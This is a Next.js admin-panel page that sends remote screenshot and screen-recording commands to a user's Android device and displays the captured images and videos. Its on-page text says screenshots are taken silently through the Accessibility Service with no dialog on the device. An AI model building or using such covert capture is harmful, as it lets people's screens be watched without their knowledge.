'use client';
import { useEffect, useState, useCallback, useRef } from 'react';
import { useParams, useRouter } from 'next/navigation';
import {
  ArrowLeft, Monitor, Loader, Download, AlertCircle, RefreshCw,
  Wifi, WifiOff, Video, Square, Play,
} from 'lucide-react';
import { adminApi } from '@/lib/adminApi';
import PageLoader from '@/components/PageLoader';
import { toast } from 'sonner';

interface Cmd {
  id: string; commandType: string; status: string;
  result: string | null; issuedAt: string; completedAt: string | null;
}
interface DeviceInfo { deviceId: string; name: string; isOnline: boolean; }

const STATUS: Record<string, { label: string; color: string; dot: string }> = {
  pending:   { label: 'Waiting for device…', color: 'text-yellow-400', dot: 'bg-yellow-400 animate-pulse' },
  delivered: { label: 'Delivered',            color: 'text-blue-400',   dot: 'bg-blue-400 animate-pulse' },
  executing: { label: 'Running…',             color: 'text-indigo-400', dot: 'bg-indigo-400 animate-pulse' },
  completed: { label: 'Completed',            color: 'text-green-400',  dot: 'bg-green-400' },
  failed:    { label: 'Failed',               color: 'text-red-400',    dot: 'bg-red-500' },
};
function fmtTime(s: string) {
  return new Date(s).toLocaleString('en-IN', { dateStyle: 'short', timeStyle: 'medium' });
}
function fmtDuration(s: number) {
  const m = Math.floor(s / 60), sec = s % 60;
  return m > 0 ? `${m}m ${sec}s` : `${sec}s`;
}

function ScreenshotCard({ cmd }: { cmd: Cmd }) {
  const st = STATUS[cmd.status] ?? STATUS.pending;
  const isPending = ['pending', 'delivered', 'executing'].includes(cmd.status);
  let result: Record<string, unknown> | null = null;
  try { result = cmd.result ? JSON.parse(cmd.result) : null; } catch {}

  return (
    <div className="bg-gray-900 border border-gray-800 rounded-2xl overflow-hidden">
      <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <Monitor size={14} className="text-cyan-400" />
          <span className="text-white text-xs font-semibold">Screenshot</span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${st.dot}`} />
          <span className={`text-xs font-medium ${st.color}`}>{st.label}</span>
        </div>
      </div>

      {result?.type === 'screenshot' && result.data ? (
        <div className="relative">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={`data:${result.mimeType ?? 'image/jpeg'};base64,${result.data}`}
            alt="Screenshot" className="w-full object-contain bg-black max-h-[500px]" />
          <a href={`data:${result.mimeType ?? 'image/jpeg'};base64,${result.data}`}
            download={`screenshot_${cmd.id.slice(0, 8)}.jpg`}
            className="absolute bottom-3 right-3 flex items-center gap-1.5 bg-black/60 hover:bg-black/80 text-white text-xs px-3 py-1.5 rounded-full">
            <Download size={12} /> Save
          </a>
        </div>
      ) : isPending ? (
        <div className="flex flex-col items-center justify-center py-12 gap-3 text-gray-500">
          <div className="w-10 h-10 border-4 border-cyan-900 border-t-cyan-500 rounded-full animate-spin" />
          <p className="text-sm">Capturing screen…</p>
          <p className="text-xs text-gray-600">Requires Accessibility Service enabled on device</p>
        </div>
      ) : result?.type === 'error' ? (
        <div className="flex items-center gap-2 px-4 py-6 text-red-400 text-sm">
          <AlertCircle size={16} /> {String(result.message ?? 'Failed')}
        </div>
      ) : (
        <div className="px-4 py-6 text-gray-600 text-sm">No result yet</div>
      )}

      <div className="px-4 py-2 text-gray-600 text-xs border-t border-gray-800">
        {fmtTime(cmd.issuedAt)}{cmd.completedAt && ` · Done: ${fmtTime(cmd.completedAt)}`}
      </div>
    </div>
  );
}

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:3000';

function VideoCard({ cmd }: { cmd: Cmd }) {
  const st = STATUS[cmd.status] ?? STATUS.pending;
  const isPending = ['pending', 'delivered', 'executing'].includes(cmd.status);
  let result: Record<string, unknown> | null = null;
  try { result = cmd.result ? JSON.parse(cmd.result) : null; } catch {}

  const isStop   = cmd.commandType === 'stop_screen_record';
  const label    = isStop ? 'Stop Recording' : 'Start Recording';
  const videoUrl = result?.type === 'video_url' ? `${API_URL}${result.url as string}` : null;

  return (
    <div className="bg-gray-900 border border-gray-800 rounded-2xl overflow-hidden">
      <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <Video size={14} className="text-purple-400" />
          <span className="text-white text-xs font-semibold">{label}</span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${st.dot}`} />
          <span className={`text-xs font-medium ${st.color}`}>{st.label}</span>
        </div>
      </div>

      {videoUrl ? (
        <div className="relative bg-black">
          <video src={videoUrl} controls className="w-full max-h-[500px]" />
          <div className="flex items-center justify-between px-4 py-2 border-t border-gray-800">
            <span className="text-gray-500 text-xs">
              Duration: {fmtDuration(Number(result?.duration ?? 0))} ·{' '}
              {((Number(result?.size ?? 0)) / 1024 / 1024).toFixed(1)} MB
            </span>
            <a href={videoUrl} download={`recording_${cmd.id.slice(0, 8)}.mp4`}
              className="flex items-center gap-1.5 bg-purple-900/40 hover:bg-purple-900/60 text-purple-300 text-xs px-3 py-1.5 rounded-full">
              <Download size={12} /> Download
            </a>
          </div>
        </div>
      ) : isPending ? (
        <div className="flex flex-col items-center justify-center py-10 gap-3 text-gray-500">
          <div className="w-10 h-10 border-4 border-purple-900 border-t-purple-500 rounded-full animate-spin" />
          <p className="text-sm">{isStop ? 'Finalising recording…' : 'Waiting for device to accept…'}</p>
          {!isStop && <p className="text-xs text-gray-600">User must tap &quot;Allow&quot; on the device</p>}
        </div>
      ) : result?.type === 'ok' ? (
        <div className="flex items-center gap-2 px-4 py-6 text-green-400 text-sm">
          <Play size={14} /> {String(result.message ?? 'Recording started')}
        </div>
      ) : result?.type === 'error' ? (
        <div className="flex items-center gap-2 px-4 py-6 text-red-400 text-sm">
          <AlertCircle size={16} /> {String(result.message ?? 'Failed')}
        </div>
      ) : (
        <div className="px-4 py-6 text-gray-600 text-sm">No result yet</div>
      )}

      <div className="px-4 py-2 text-gray-600 text-xs border-t border-gray-800">
        {fmtTime(cmd.issuedAt)}{cmd.completedAt && ` · Done: ${fmtTime(cmd.completedAt)}`}
      </div>
    </div>
  );
}

export default function AdminScreenshotPage() {
  const { userId, deviceId } = useParams<{ userId: string; deviceId: string }>();
  const router = useRouter();

  const [device,    setDevice]    = useState<DeviceInfo | null>(null);
  const [commands,  setCommands]  = useState<Cmd[]>([]);
  const [busySnap,  setBusySnap]  = useState(false);
  const [busyRec,   setBusyRec]   = useState(false);
  const [loading,   setLoading]   = useState(true);
  const [activeTab, setActiveTab] = useState<'screenshot' | 'recording'>('screenshot');
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const isRecording = (() => {
    const starts = commands.filter((c) => c.commandType === 'start_screen_record');
    const stops  = commands.filter((c) => c.commandType === 'stop_screen_record');
    if (starts.length === 0) return false;
    const lastStart = starts[0];
    if (stops.length === 0) return ['completed', 'pending', 'delivered', 'executing'].includes(lastStart.status);
    return new Date(lastStart.issuedAt) > new Date(stops[0].issuedAt);
  })();

  useEffect(() => {
    adminApi.userDetail(userId).then((r) => {
      setDevice(r.data.devices?.find((d: DeviceInfo) => d.deviceId === deviceId) ?? null);
    }).catch(() => {});
  }, [userId, deviceId]);

  const fetchCmds = useCallback(async () => {
    try {
      const r = await adminApi.deviceCommands(deviceId);
      setCommands(
        (r.data as Cmd[]).filter((c) =>
          ['take_screenshot', 'start_screen_record', 'stop_screen_record'].includes(c.commandType)
        )
      );
    } catch {}
  }, [deviceId]);

  useEffect(() => {
    setLoading(true);
    fetchCmds().finally(() => setLoading(false));
    pollRef.current = setInterval(fetchCmds, 2000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [fetchCmds]);

  async function capture() {
    setBusySnap(true);
    try {
      await adminApi.issueCommand(deviceId, 'take_screenshot');
      await fetchCmds();
      toast.success('Screenshot command sent');
    } catch { toast.error('Failed to send command'); }
    finally { setBusySnap(false); }
  }

  async function startRecording() {
    setBusyRec(true);
    try {
      await adminApi.issueCommand(deviceId, 'start_screen_record');
      await fetchCmds();
      toast.success('Recording command sent — user must tap Allow on device');
    } catch { toast.error('Failed to send command'); }
    finally { setBusyRec(false); }
  }

  async function stopRecording() {
    setBusyRec(true);
    try {
      await adminApi.issueCommand(deviceId, 'stop_screen_record');
      await fetchCmds();
      toast.success('Stop command sent — finalising video…');
    } catch { toast.error('Failed to send command'); }
    finally { setBusyRec(false); }
  }

  const screenshots = commands.filter((c) => c.commandType === 'take_screenshot');
  const recCmds     = commands.filter((c) =>
    ['start_screen_record', 'stop_screen_record'].includes(c.commandType));

  return (
    <div className="flex-1 flex flex-col min-h-0">
      {/* Header */}
      <div className="px-8 pt-8 pb-5 border-b border-gray-800">
        <button onClick={() => router.push(`/admin/users/${userId}/remote/${deviceId}`)}
          className="flex items-center gap-2 text-gray-400 hover:text-white text-sm mb-4 transition-colors">
          <ArrowLeft size={15} /> Remote Access
        </button>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-cyan-500/20 rounded-xl flex items-center justify-center">
              <Monitor size={20} className="text-cyan-400" />
            </div>
            <div>
              <h1 className="text-xl font-extrabold text-white">Screenshot & Recording</h1>
              <div className="flex items-center gap-2 mt-0.5">
                <span className="text-gray-400 text-sm">{device?.name ?? deviceId}</span>
                {device?.isOnline
                  ? <span className="flex items-center gap-1 text-green-400 text-xs"><Wifi size={11} /> Live</span>
                  : <span className="flex items-center gap-1 text-gray-500 text-xs"><WifiOff size={11} /> Offline</span>}
              </div>
            </div>
          </div>
          <button onClick={fetchCmds} className="text-gray-600 hover:text-gray-300"><RefreshCw size={15} /></button>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-8 space-y-6">

        {/* Tab bar */}
        <div className="flex gap-2 p-1 bg-gray-800 rounded-2xl w-fit">
          <button
            onClick={() => setActiveTab('screenshot')}
            className={`flex items-center gap-2 px-5 py-2.5 rounded-xl text-sm font-semibold transition-all ${
              activeTab === 'screenshot'
                ? 'bg-gray-700 text-cyan-400 shadow'
                : 'text-gray-500 hover:text-gray-300'
            }`}
          >
            <Monitor size={15} />
            Screenshots
            {screenshots.length > 0 && (
              <span className={`text-xs px-1.5 py-0.5 rounded-full font-bold ${
                activeTab === 'screenshot' ? 'bg-cyan-900/60 text-cyan-400' : 'bg-gray-700 text-gray-500'
              }`}>{screenshots.length}</span>
            )}
          </button>
          <button
            onClick={() => setActiveTab('recording')}
            className={`flex items-center gap-2 px-5 py-2.5 rounded-xl text-sm font-semibold transition-all ${
              activeTab === 'recording'
                ? 'bg-gray-700 text-purple-400 shadow'
                : 'text-gray-500 hover:text-gray-300'
            }`}
          >
            <Video size={15} />
            Screen Recording
            {recCmds.length > 0 && (
              <span className={`text-xs px-1.5 py-0.5 rounded-full font-bold ${
                activeTab === 'recording' ? 'bg-purple-900/60 text-purple-400' : 'bg-gray-700 text-gray-500'
              }`}>{recCmds.length}</span>
            )}
          </button>
        </div>

        {/* Action button + info — changes per tab */}
        {activeTab === 'screenshot' ? (
          <div className="space-y-3">
            <button onClick={capture} disabled={busySnap}
              className="flex items-center gap-2 px-5 py-3 rounded-2xl bg-cyan-600 hover:bg-cyan-700 text-white font-bold text-sm transition-all active:scale-95 disabled:opacity-60 shadow-lg">
              {busySnap ? <Loader size={16} className="animate-spin" /> : <Monitor size={16} />}
              Capture Screen
            </button>
            <p className="text-xs text-gray-500 bg-gray-900 border border-gray-800 rounded-xl px-4 py-2.5">
              Silent capture via Accessibility Service (Android 11+). No dialog shown on device.
            </p>
          </div>
        ) : (
          <div className="space-y-3">
            <div className="flex items-center gap-4">
              {isRecording ? (
                <button onClick={stopRecording} disabled={busyRec}
                  className="flex items-center gap-2 px-5 py-3 rounded-2xl bg-red-600 hover:bg-red-700 text-white font-bold text-sm transition-all active:scale-95 disabled:opacity-60 shadow-lg">
                  {busyRec ? <Loader size={16} className="animate-spin" /> : <Square size={16} />}
                  Stop Recording
                </button>
              ) : (
                <button onClick={startRecording} disabled={busyRec}
                  className="flex items-center gap-2 px-5 py-3 rounded-2xl bg-purple-600 hover:bg-purple-700 text-white font-bold text-sm transition-all active:scale-95 disabled:opacity-60 shadow-lg">
                  {busyRec ? <Loader size={16} className="animate-spin" /> : <Video size={16} />}
                  Start Recording
                </button>
              )}
              {isRecording && (
                <span className="flex items-center gap-1.5 text-red-400 text-sm font-semibold animate-pulse">
                  <span className="w-2 h-2 rounded-full bg-red-500" /> Recording in progress
                </span>
              )}
            </div>
            <p className="text-xs text-gray-500 bg-gray-900 border border-gray-800 rounded-xl px-4 py-2.5">
              User must tap &quot;Allow&quot; once on device. A notification is shown while recording.
            </p>
          </div>
        )}

        {/* List */}
        {loading ? <PageLoader theme="dark" /> : (
          <>
            {activeTab === 'screenshot' && (
              screenshots.length > 0 ? (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {screenshots.map((cmd) => <ScreenshotCard key={cmd.id} cmd={cmd} />)}
                </div>
              ) : (
                <div className="text-center py-16 text-gray-600">
                  <Monitor size={40} className="mx-auto mb-3 opacity-20" />
                  <p>No screenshots yet. Click &quot;Capture Screen&quot; above.</p>
                </div>
              )
            )}

            {activeTab === 'recording' && (
              recCmds.length > 0 ? (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {recCmds.map((cmd) => <VideoCard key={cmd.id} cmd={cmd} />)}
                </div>
              ) : (
                <div className="text-center py-16 text-gray-600">
                  <Video size={40} className="mx-auto mb-3 opacity-20" />
                  <p>No recordings yet. Click &quot;Start Recording&quot; above.</p>
                </div>
              )
            )}
          </>
        )}
      </div>
    </div>
  );
}
